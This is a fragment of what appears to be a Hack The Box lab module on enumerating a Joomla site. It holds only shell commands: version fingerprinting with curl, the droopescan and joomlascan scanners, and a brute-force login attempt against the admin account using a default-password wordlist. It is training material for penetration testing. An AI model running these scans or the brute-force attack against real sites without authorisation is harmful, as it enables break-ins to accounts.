...
```shell-session
swmpdnky@htb[/htb]$ curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
...
```shell-session
swmpdnky@htb[/htb]$ curl -s http://dev.inlanefreight.local/ | grep Joomla
...
```shell-session
swmpdnky@htb[/htb]$ curl -s http://dev.inlanefreight.local/README.txt | head -n 5
...
```shell-session
swmpdnky@htb[/htb]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
...
```shell-session
swmpdnky@htb[/htb]$ sudo pip3 install droopescan
...
```shell-session
swmpdnky@htb[/htb]$ droopescan scan joomla --url http://dev.inlanefreight.local/
...
```shell-session
swmpdnky@htb[/htb]$ sudo python2.7 -m pip install urllib3
swmpdnky@htb[/htb]$ sudo python2.7 -m pip install certifi
swmpdnky@htb[/htb]$ sudo python2.7 -m pip install bs4
```
...
```shell-session
swmpdnky@htb[/htb]$ python2.7 joomlascan.py -u http://dev.inlanefreight.local
...
```shell-session
swmpdnky@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
